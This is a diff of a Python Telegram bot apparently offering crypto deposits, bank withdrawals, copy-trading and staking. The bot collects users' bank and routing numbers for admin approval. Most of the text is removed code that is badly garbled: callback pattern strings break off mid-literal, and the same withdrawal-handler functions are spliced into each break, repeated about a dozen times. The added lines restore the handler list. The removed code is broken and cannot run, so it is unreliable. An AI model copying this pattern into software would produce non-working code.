-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(handle_deposit, pattern='^deposit
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(show_main_menu, pattern='^proceed_to_menu$'),
+                CallbackQueryHandler(back_to_menu, pattern='^back_to_menu$'),
+                CallbackQueryHandler(refresh_balance, pattern='^refresh_balance$'),
+                CallbackQueryHandler(visit_website, pattern='^visit_website$'),
+                CallbackQueryHandler(handle_deposit, pattern='^deposit$'),
+                CallbackQueryHandler(show_crypto_options, pattern='^deposit_crypto$'),
                 CallbackQueryHandler(handle_crypto_selection, pattern='^crypto_select_'),
                 CallbackQueryHandler(copy_address, pattern='^copy_address_'),
-                CallbackQueryHandler(payment_made, pattern='^payment_made
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(payment_made, pattern='^payment_made$'),
                 CallbackQueryHandler(handle_deposit_confirmation, pattern='^confirm_deposit_'),
-                CallbackQueryHandler(handle_withdrawal, pattern='^withdraw
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(show_copy_trade, pattern='^copy_trade
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(handle_withdrawal, pattern='^withdraw$'),
+                CallbackQueryHandler(withdraw_crypto_amount, pattern='^withdraw_crypto$'),
+                CallbackQueryHandler(withdraw_bank_amount, pattern='^withdraw_bank$'),
+                CallbackQueryHandler(show_copy_trade, pattern='^copy_trade$'),
                 CallbackQueryHandler(select_trading_bot, pattern='^select_bot_'),
-                CallbackQueryHandler(handle_stake, pattern='^stake
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['account_number'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your routing number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ROUTING
-
-async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get routing number and process bank withdrawal"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['routing_number'] = update.message.text.strip()
-    
-    user_info = get_user_data(user_id)
-    amount = context.user_data['withdraw_amount']
-    bank_name = context.user_data['bank_name']
-    account_number = context.user_data['account_number']
-    routing_number = context.user_data['routing_number']
-    
-    admin_message = f"""💸 **Bank Withdrawal Request**
-
-👤 **User:** {user_info['name']} (ID: {user_id})
-💰 **Amount:** ${amount:.2f}
-🏦 **Bank:** {bank_name}
-🔢 **Account:** {account_number}
-🔢 **Routing:** {routing_number}
-📱 **Phone:** {user_info['phone']}
-📧 **Email:** {user_info['email']}
-
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    ),
+                CallbackQueryHandler(handle_stake, pattern='^stake$'),
+                CallbackQueryHandler(cancel_operation, pattern='^cancel$'),
+                CallbackQueryHandler(handle_admin_action, pattern='^admin_'),
             ],
             DEPOSIT_AMOUNT: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, get_deposit_amount),
-                CallbackQueryHandler(cancel_operation, pattern='^cancel
-    
-    try:
-        await context.bot.send_message(
-            chat_id=ADMIN_USER_ID,
-            text=admin_message,
-            reply_markup=reply_markup,
-            parse_mode='Markdown'
-        )
-    except TelegramError as e:
-        logger.error(f"Failed to send admin notification: {e}")
-        await update.message.reply_text(
-            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-        )
-        return MAIN_MENU
-    
-    user_info['pending_withdrawal'] = amount
-    
-    await update.message.reply_text(
-        "Your withdrawal request is pending admin confirmation.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
-    )
-    return MAIN_MENU
-
-async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get bank name"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
-        await update.message.reply_text("Admins cannot access user features.")
-        return ConversationHandler.END
-    context.user_data['bank_name'] = update.message.text.strip()
-    
-    await update.message.reply_text(
-        "Please enter your account number:",
-        reply_markup=create_cancel_keyboard()
-    )
-    return WITHDRAW_ACCOUNT
-
-async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Get account number"""
-    user_id = update.effective_user.id
-    if user_id == ADMIN_USER_ID:
